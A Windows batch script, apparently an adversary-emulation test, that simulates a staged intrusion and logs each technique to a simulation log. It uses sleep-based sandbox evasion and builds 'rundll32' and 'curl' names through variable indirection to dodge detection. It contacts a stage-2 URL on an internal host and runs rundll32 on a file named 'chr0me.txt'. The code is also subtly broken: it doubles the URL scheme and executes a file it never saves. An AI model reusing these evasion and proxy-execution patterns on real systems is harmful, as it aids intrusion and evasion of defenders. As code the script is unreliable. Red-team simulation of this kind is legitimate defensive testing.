@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ constants (plain literals - NEVER obfuscated)
SET fpakbq=Macula-Stage0-7580
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?7580-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=chr0me.txt
SET fpldhe=7580

REM Initial sandbox evasion delay
ping -n 31 127.0.0.1 >nul

REM Obfuscated LOLBIN references using variable indirection
SET bin1=Run
SET bin2=dll
SET bin3=32
SET bin4=.ex
SET bin5=e
SET ref1=bin1
SET ref2=bin2
SET ref3=bin3
SET ref4=bin4
SET ref5=bin5

REM Build LOLBIN through multiple indirection layers
FOR /F "tokens=*" %%i IN ('echo !%ref1%!') DO SET part1=%%i
FOR /F "tokens=*" %%i IN ('echo !%ref2%!') DO SET part2=%%i
FOR /F "tokens=*" %%i IN ('echo !%ref3%!') DO SET part3=%%i
FOR /F "tokens=*" %%i IN ('echo !%ref4%!') DO SET part4=%%i
FOR /F "tokens=*" %%i IN ('echo !%ref5%!') DO SET part5=%%i

SET lolbin=%part1%%part2%%part3%%part4%%part5%
timeout /t 12 /nobreak >nul

REM Obfuscate curl command
SET curl1=cur
SET curl2=l
SET curl3=-k
SET curl4=-s
SET curl5=-o
SET curl6=nul
SET curl_var=curl1
FOR /F "tokens=*" %%i IN ('echo !%curl_var%!') DO SET curl_cmd=%%i
SET curl_cmd=%curl_cmd%%curl2%

REM Check server availability
%curl_cmd% %curl3% %curl4% %curl5% %curl6% https://%rdzgrnne%/

REM Log TTP execution for heartbeat check
SET rslt=1
SET err=
FOR /F "tokens=1-3 delims=/ " %%a IN ("%DATE%") DO SET yyyy=%%c&SET mm=%%a&SET dd=%%b
SET tstamp=%yyyy%-%mm%-%dd% %TIME%
IF ERRORLEVEL 1 (
    SET rslt=0
    SET err=connection_failed
)

(
    echo [!tstamp!][%omxgazu%]: %yydue%-%fpldhe%-T1105|Ingress Tool Transfer=%rslt%:%err%
) >> "%APPDATA%\%yydue%\macula-simulations.log" 2>nul || echo. >nul

CHOICE /C Y /N /D Y /T 8 >nul

REM Build DLL execution command with obfuscation
SET arg1=%edjwtl%
SET arg2=, Dll
SET arg3=Main
SET arg_var1=arg1
SET arg_var2=arg2
SET arg_var3=arg3

FOR /F "tokens=*" %%i IN ('echo !%arg_var1%!') DO SET dll_arg1=%%i
FOR /F "tokens=*" %%i IN ('echo !%arg_var2%!') DO SET dll_arg2=%%i
FOR /F "tokens=*" %%i IN ('echo !%arg_var3%!') DO SET dll_arg3=%%i

SET /A rdelay=%RANDOM% %% 20 + 10
timeout /t %rdelay% /nobreak >nul

REM Execute DLL with obfuscated command
C:\Windows\System32\%lolbin% %dll_arg1%%dll_arg2%%dll_arg3%

REM Log TTP execution for DLL execution
SET rslt2=1
SET err2=
IF ERRORLEVEL 1 (
    SET rslt2=0
    SET err2=execution_failed
)

FOR /F "tokens=1-3 delims=/ " %%a IN ("%DATE%") DO SET yyyy2=%%c&SET mm2=%%a&SET dd2=%%b
SET tstamp2=%yyyy2%-%mm2%-%dd2% %TIME%

(
    echo [!tstamp2!][%omxgazu%]: %yydue%-%fpldhe%-T1218|Signed Binary Proxy Execution=%rslt2%:%err2%
) >> "%APPDATA%\%yydue%\macula-simulations.log" 2>nul || echo. >nul

ping -n 18 127.0.0.1 >nul
ENDLOCAL